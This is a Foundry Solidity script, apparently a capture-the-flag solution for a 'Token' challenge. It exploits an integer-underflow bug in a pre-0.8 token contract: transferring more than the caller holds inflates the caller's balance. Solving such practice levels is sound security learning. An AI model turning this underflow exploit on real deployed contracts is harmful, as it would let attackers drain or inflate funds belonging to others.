// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Token.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract TokenSolution is Script {

    Token public tokenInstance = Token(0x992Aa34Be5f45842e82dC2663Fa3b0E4fb5b0466);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        tokenInstance.transfer(address(0), 21);
        console.log("My balance: ", tokenInstance.balanceOf(vm.envAddress("PUBLIC_KEY")));
        vm.stopBroadcast();
    }
}